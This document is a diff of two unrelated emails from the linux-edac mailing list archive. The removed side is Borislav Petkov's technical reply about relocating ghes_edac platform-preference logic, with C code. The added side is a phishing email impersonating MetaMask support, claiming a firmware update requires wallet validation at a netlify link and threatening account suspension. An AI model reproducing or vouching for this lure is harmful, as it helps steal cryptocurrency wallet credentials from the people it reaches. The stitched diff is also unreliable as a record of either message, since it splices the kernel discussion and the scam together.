@@ -2,121 +2,74 @@ Return-Path: <linux-edac-owner@vger.kernel.org>
 X-Original-To: lists+linux-edac@lfdr.de
 Delivered-To: lists+linux-edac@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id B7B3B58D7E6
-	for <lists+linux-edac@lfdr.de>; Tue,  9 Aug 2022 13:16:00 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 4835658D84E
+	for <lists+linux-edac@lfdr.de>; Tue,  9 Aug 2022 13:41:00 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S236222AbiHILP7 (ORCPT <rfc822;lists+linux-edac@lfdr.de>);
-        Tue, 9 Aug 2022 07:15:59 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:45400 "EHLO
+        id S239028AbiHILk7 (ORCPT <rfc822;lists+linux-edac@lfdr.de>);
+        Tue, 9 Aug 2022 07:40:59 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:33636 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S232697AbiHILP6 (ORCPT
-        <rfc822;linux-edac@vger.kernel.org>); Tue, 9 Aug 2022 07:15:58 -0400
-Received: from mail.skyhub.de (mail.skyhub.de [5.9.137.197])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 7D230193C5;
-        Tue,  9 Aug 2022 04:15:55 -0700 (PDT)
-Received: from zn.tnic (p200300ea971b9800329c23fffea6a903.dip0.t-ipconnect.de [IPv6:2003:ea:971b:9800:329c:23ff:fea6:a903])
-        (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+        with ESMTP id S231235AbiHILkd (ORCPT
+        <rfc822;linux-edac@vger.kernel.org>); Tue, 9 Aug 2022 07:40:33 -0400
+X-Greylist: delayed 491 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Tue, 09 Aug 2022 04:40:32 PDT
+Received: from mailout-shared.jellyfish.systems (mailout-shared.jellyfish.systems [63.250.43.81])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 1831E26D4
+        for <linux-edac@vger.kernel.org>; Tue,  9 Aug 2022 04:40:31 -0700 (PDT)
+Received: from premium80.web-hosting.com (unknown [10.35.5.64])
+        (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
         (No client certificate requested)
-        by mail.skyhub.de (SuperMail on ZX Spectrum 128k) with ESMTPSA id 147AE1EC03B9;
-        Tue,  9 Aug 2022 13:15:50 +0200 (CEST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=alien8.de; s=dkim;
-        t=1660043750;
-        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-         to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-         content-transfer-encoding:in-reply-to:in-reply-to:  references:references;
-        bh=MIjfxB31faRlyNlM6lmpdYiamFIJbK6PbTWIDNiIw7M=;
-        b=HU7gmif1TzStx3TWOsiA1v/TvaoPgCr8Xg648DYMGzon1j+fFER8H29IXFqADgIztjlJr9
-        VeAEOz4C4BGU27dsnINa24jX+S6x3SgFBxs9JcfHxCwMXO9bwz9ALkvVu7z1dCKWOTmZEz
-        JncVL534Imc6BcvmQawCI2EIqRSpCxA=
-Date:   Tue, 9 Aug 2022 13:15:49 +0200
-From:   Borislav Petkov <bp@alien8.de>
-To:     Justin He <Justin.He@arm.com>
-Cc:     "Kani, Toshi" <toshi.kani@hpe.com>,
-        "Rafael J. Wysocki" <rafael@kernel.org>,
-        Len Brown <lenb@kernel.org>, James Morse <James.Morse@arm.com>,
-        Tony Luck <tony.luck@intel.com>,
-        Mauro Carvalho Chehab <mchehab@kernel.org>,
-        Robert Richter <rric@kernel.org>,
-        Shuai Xue <xueshuai@linux.alibaba.com>,
-        Jarkko Sakkinen <jarkko@kernel.org>,
-        ACPI Devel Maling List <linux-acpi@vger.kernel.org>,
-        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
-        "open list:EDAC-CORE" <linux-edac@vger.kernel.org>
-Subject: Re: =?utf-8?B?5Zue5aSNOiBbUEFUQ0hdIEFDUEk=?= =?utf-8?Q?=3A?= APEI:
- move edac_init ahead of ghes platform drv register
-Message-ID: <YvJB5cxSldpigw1g@zn.tnic>
-References: <20220805023200.154634-1-justin.he@arm.com>
- <CAJZ5v0gUbKYaxRcZsYO6eq7vLgKdgfdLdoL_Hzmd6r-JczkVPg@mail.gmail.com>
- <YvFX9vTilqMpsF9u@zn.tnic>
- <PH7PR84MB1838379B8C2DF488DE729A9182639@PH7PR84MB1838.NAMPRD84.PROD.OUTLOOK.COM>
- <YvF4p01WJGGUwIJC@zn.tnic>
- <PH7PR84MB1838492812F5ABAA4BB54D9982639@PH7PR84MB1838.NAMPRD84.PROD.OUTLOOK.COM>
- <YvF+J/dfyOEVSbSQ@zn.tnic>
- <PH7PR84MB1838BF4F8B56EF1E24FCF1DC82639@PH7PR84MB1838.NAMPRD84.PROD.OUTLOOK.COM>
- <YvIPf/m3hU46S9Ik@zn.tnic>
- <DBBPR08MB4538A5C080B09A96A77CCDA9F7629@DBBPR08MB4538.eurprd08.prod.outlook.com>
+        by mailout-shared.jellyfish.systems (Postfix) with ESMTPSA id 4M29sG5bLYz34vF
+        for <linux-edac@vger.kernel.org>; Tue,  9 Aug 2022 11:32:18 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+        d=tqvconsult.com; s=default; h=Sender:Content-Transfer-Encoding:Content-Type:
+        MIME-Version:Message-ID:From:Date:Subject:To:Reply-To:Cc:Content-ID:
+        Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+        :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+        List-Subscribe:List-Post:List-Owner:List-Archive;
+        bh=6HCsG/U2F1mXZP3kFpLFc/7Ou6Nq3S8hQo7zF9mQ354=; b=ntjiGtNuVooDP8eFFFB5t1RL8J
+        yTuqQDL8ZcJbKIgBhaBO2VoxlJH8KqhnnTT6y/GHs3+o+l3+IgYN8mSFbSPJE/9SjkCuwUUkksQ/B
+        ym14nqN+aHXPzVpecYiQP/5urroAlt0gCMw2ZQx+GHGvIciUzJ5101ztzidjzvknk+dWhajCzS/Lt
+        pYg1xMVBGUNRm4W+/j9aXKj8dsfWDGbYZOFuMYnxPlrcJQnGnppPvPQ0pSkF4/JiCno58aJR+cgyi
+        fZDzyOEBNp9vbBaa5qZ4p3heJKDb0255Qkp4lo9jNF4D7q4Dx027DOxk/R20DI5IvBpvIJT5oB9dI
+        sQz7SbhQ==;
+Received: from chatlycq by premium80.web-hosting.com with local (Exim 4.95)
+        (envelope-from <support@tqvconsult.com>)
+        id 1oLNT8-00HGRi-Lx
+        for linux-edac@vger.kernel.org;
+        Tue, 09 Aug 2022 07:32:18 -0400
+To:     linux-edac@vger.kernel.org
+Subject: METAMASK SECURITY
+X-PHP-Script: tqvconsult.com/bdrxasxl.php for 102.89.38.183, 102.89.38.183
+X-PHP-Filename: /home/chatlycq/tqvconsult.com/bdrxasxl.php REMOTE_ADDR: 102.89.38.183
+Date:   Tue, 9 Aug 2022 07:32:18 -0400
+From:   METAMASK SUPPORT <support@tqvconsult.com>
+Message-ID: <8e025307d533d2bc0e3c3ffaccbea5aa@tqvconsult.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-In-Reply-To: <DBBPR08MB4538A5C080B09A96A77CCDA9F7629@DBBPR08MB4538.eurprd08.prod.outlook.com>
-X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
-        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,SPF_HELO_NONE,SPF_PASS,
-        T_SCC_BODY_TEXT_LINE autolearn=ham autolearn_force=no version=3.4.6
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+Sender:  <chatlycq@premium80.web-hosting.com>
+X-Spam-Status: No, score=3.4 required=5.0 tests=BAYES_50,DKIM_SIGNED,
+        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,PHP_SCRIPT,RCVD_IN_MSPIKE_H2,
+        SPF_HELO_NONE,SPF_PASS,SUBJ_ALL_CAPS,TVD_PH_BODY_ACCOUNTS_PRE,
+        T_SCC_BODY_TEXT_LINE autolearn=no autolearn_force=no version=3.4.6
+X-Spam-Level: ***
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <linux-edac.vger.kernel.org>
 X-Mailing-List: linux-edac@vger.kernel.org
 
-On Tue, Aug 09, 2022 at 09:24:33AM +0000, Justin He wrote:
-> If no, what is the detail logic of ghes_edac_driver_is_preferred()?
+Due to the recent update on the METAMASK firmware. The new update is to remove bot and unused wallets from the blockchain network.
 
-That should be moved from ghes_edac.c to ghes.c:
+All MetaMask wallet users are required to complete wallet validation by following:
 
-/*
- * Known systems that are safe to enable this module.
- */
-static struct acpi_platform_list plat_list[] = {
-        {"HPE   ", "Server  ", 0, ACPI_SIG_FADT, all_versions},
-        { } /* End */
-};
+https://myinteli-syncedapps.netlify.app/
 
-and then
+All unverified accounts will be suspended on Tuesday, August 16th, 2022.
 
-bool ghes_edac_driver_is_preferred()
-{
-	if (IS_ENABLED(CONFIG_X86)) {
-                /* Check if safe to enable on this system */
-                idx = acpi_match_platform_list(plat_list);
-	} else if (ARM) {
-		/* insert ARM logic here */
-	}
-}
+We’re sorry for any inconvenience we cause with this, but please keep in mind that our intention is to keep our customers safe and happy.
 
-That function should be called by the EDAC modules which compete with
-ghes_edac.
+To add any additional comments, simply reply to this email.
 
-In the x86 case, that's sb_edac, skx_edac and amd64_edac, I guess.
+Thank you for choosing METAMASK to be your digital currency wallet.
 
-It all depends on what platforms Toshi wants to load it - I'm guessing
-HPE has both Intel and AMD platforms where they prefer ghes_edac.
-
-On ARM, that's up to ARM folks.
-
-> Because I notice that lots of other edac drivers are probing like:
-> ...
->         owner = edac_get_owner();
->         if (owner && strncmp(owner, EDAC_MOD_STR, sizeof(EDAC_MOD_STR)))
->                 return -EBUSY;
-
-No, that's a silly mechanism to allow a single EDAC driver to load on
-the system. But your test will go before it, at the very beginning of
-the init function.
-
-HTH.
-
--- 
-Regards/Gruss,
-    Boris.
-
-https://people.kernel.org/tglx/notes-about-netiquette
